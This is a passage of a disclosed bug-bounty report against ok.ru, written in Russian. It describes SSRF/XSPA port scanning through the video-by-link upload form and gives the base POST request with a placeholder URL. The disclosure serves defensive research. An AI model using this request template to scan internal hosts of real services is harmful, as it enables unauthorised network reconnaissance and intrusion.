@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/77817
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/alpha
+ReportedTo:ok.ru(ok)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:17.02.2016 16:56:23
+
+Summary:
+Недостаточная фильтрация URL и отсутствие ограничений по количеству запросов в форме загрузки видео по ссылке позволяет выполнить атаку SSRF типа XSPA, сканирование удаленных портов от серверов mail.ru (например, photo55.mail.ru), сканирование loopback и т.д.
+
+Базовый запрос:
+```
+POST /dk?cmd=videoCommand&a=grabMovie HTTP/1.1
+Host: ok.ru
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+TKN: dFrdkb3Y0AiaauwIqGQ4sCyHgrQsROiT
+X-Requested-With: XMLHttpRequest
+Referer: http://ok.ru/video/top
+Content-Length: 38
+Cookie: COOKIES
+
+link=URL
+```
+
